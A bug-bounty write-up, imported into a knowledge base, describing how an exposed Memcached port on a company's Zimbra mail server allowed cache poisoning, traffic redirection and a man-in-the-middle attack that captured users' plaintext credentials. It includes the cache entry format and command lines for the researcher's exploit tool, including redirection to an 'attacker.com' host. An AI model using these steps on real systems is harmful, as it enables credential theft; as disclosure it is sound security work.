---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-07-02_story-of-a-25k-bounty-ssrf-on-zimbra-led-to-dump-all-credentials-in-clear-text.md
original_filename: 2020-07-02_story-of-a-25k-bounty-ssrf-on-zimbra-led-to-dump-all-credentials-in-clear-text.md
title: Story of a 2.5k Bounty — SSRF on Zimbra Led to Dump All Credentials in Clear
  Text
category: documents
detected_topics:
- sso
- ssrf
- command-injection
- rate-limit
- automation-abuse
- api-security
tags:
- imported
- documents
- sso
- ssrf
- command-injection
- rate-limit
- automation-abuse
- api-security
language: en
raw_sha256: a53433557cfa1d97e4ecdba21dc65c8f4ccae4c126b4d065c53f93606cc08183
text_sha256: 5440410af161f4988a0eaf10787569172632e78919d38b295bc4553ce42946d7
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: false
---

# Story of a 2.5k Bounty — SSRF on Zimbra Led to Dump All Credentials in Clear Text

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-07-02_story-of-a-25k-bounty-ssrf-on-zimbra-led-to-dump-all-credentials-in-clear-text.md
- Source Type: markdown
- Detected Topics: sso, ssrf, command-injection, rate-limit, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: False
- Raw SHA256: `a53433557cfa1d97e4ecdba21dc65c8f4ccae4c126b4d065c53f93606cc08183`
- Text SHA256: `5440410af161f4988a0eaf10787569172632e78919d38b295bc4553ce42946d7`


## Content

---
title: "Story of a 2.5k Bounty — SSRF on Zimbra Led to Dump All Credentials in Clear Text"
url: "https://infosecwriteups.com/story-of-a-2-5k-bounty-ssrf-on-zimbra-led-to-dump-all-credentials-in-clear-text-6fe826005ccc"
authors: ["Yashar Shahinzadeh (@YShahinzadeh)"]
programs: ["Cafebazaar"]
bugs: ["SSRF"]
bounty: "2,500"
publication_date: "2020-07-02"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4452
scraped_via: "browseros"
---

# Story of a 2.5k Bounty — SSRF on Zimbra Led to Dump All Credentials in Clear Text

Top highlight

Story of a 2.5k Bounty — SSRF on Zimbra Led to Dump All Credentials in Clear Text
Yasho
Follow
4 min read
·
Jul 2, 2020

461

2

This post is about how I and my friend got $2500 from Cafebazaar bug bounty program.

Init

During the recon phase, I enumerated the mailx.hezardastan.net host, the Cafebazaar’s webmail access. I conducted a port scanner:

There were plenty of open ports. Among them, the Memcached port, 11211, was abnormal. After some basic tests, it revealed that:

There was no need to authenticate to communicate with port 11211
Email addresses were saved by Zimbra in the cache
There was the capability of adding/modifying/deleting the cache data
There was the capability of conducting a DDOS attack

However, I was looking for something more dangerous, file disclosure, remote command execution or etc.

Attacking on the Zimbra

Considering the Zimbra source code:

fciubotaru/z-pec
A zimbra fork adding support for RFC6109. Contribute to fciubotaru/z-pec development by creating an account on GitHub.

github.com

It saves the communication protocol scheme, the username, and the backend server IP address in the Memcached. Before anything, I went through data extraction by the Metasploit, memcached_extractor module (It could be done manually):

Press enter or click to view image in full size

The email addresses could be leveraged to conduct phishing or brute-force attack. However, I wasn't still satisfied with the exploit. Let’s take a look at the workflow of the Zimbra:

a user authenticates by their credentials
The server saves username and the backend server URL in cache
The user works with Zimbra
The server retrieves the backend URL from the cache
The server communicates to the URL retrieved along with the user’s data (

Here is a sample of how Zimbra saves the data in the cache:

route:proto=imapssl;user=[REDUCTED]@cafebazaar.ir 127.0.0.1:7993
route:proto=pop3ssl;user=[REDUCTED]@cafebazaar.cloud 127.0.0.1:7995
route:proto=httpssl;user=[REDUCTED]@cafebazaar.ir 127.0.0.1:8443

The format is:

route:proto=[UserProtocol];user=EmailAddressOrID

The supported protocols:

IMAPSSL 127.0.0.1:7993
POP3SSL 127.0.0.1:7995
HTTPSSL(HTTPS) 127.0.0.1:8443

Considering the note that the backend server is accessible by the internet:

IMAPSSL mailx.hezardastan.net:7993
POP3SSL mailx.hezardastan.net:7995
HTTPSSL(HTTPS) mailx.hezardastan.net:8443

I designed an attack scenario explained in the rest.

Discovering SSRF Vulnerability

The scenario was testing server against SSRF. The attack scenario was changing the backend server IP address to an arbitrary address (attacker’s server) in order to redirect server traffic.

Get Yasho’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

The steps to test the SSRF:

Making an SSL listener on a port by self-signed SSL certificate
Changing a user’s cache to redirect the traffic

By changing the cache, a connection from maix.hezardastan.net received.

Press enter or click to view image in full size

SSRF achieved :)

Man in the Middle

The main goal was stealing users information (credentials, emails and etc) while the mail server was working properly. I had to redirect back the traffic in order to not affect the functionality. Considering the backend open ports which were accessible from the internet, I could do this scenario.

The MITM scenario:

A user logs-in into their account, the backend server IP is saved in the cache
An attacker changes the backend information to their IP address
The Zimbra’s traffic is redirected to the attacker’s server
The attacker offloads the SSL and extracts the information (credentials and etc)
The attacker makes SSL connection the backend ports which were open
The attacker will bring the cache back to the default value after the attack has done for a user.

I wrote an exploit code had several sections:

Press enter or click to view image in full size

1. Extracting the email addresses have already logged-in

python HezarSploit.py -m dumpusers

2. Fake IMAPSSL Server to communicate with the client

python HezarSploit.py -m mitm --port 4444

Dumps the credentials in the credentials.txt.

3. Modifying the cache of all users (or a user) has already logged-in

python HezarSploit.py -m poisoning --user all --ip attacker.com --port 4444

4. Changing the cache to the default values

python HezarSploit.py -m reset
Put it All Together, the Attack

In the server:

python HezarSploit.py -m mitm --port 4444

In the console:

python HezarSploit.py -m poisoning --user all --ip attacker.com --port 4444
Press enter or click to view image in full size

The results:

Press enter or click to view image in full size

I got almost all user’s password in plain-text. The samples:

Finish

I reported the vulnerability, the responded fast, patched the flaw in less than an hour. They gave me roughly 2.5k bounty just a few days after. I hope you find this post useful.
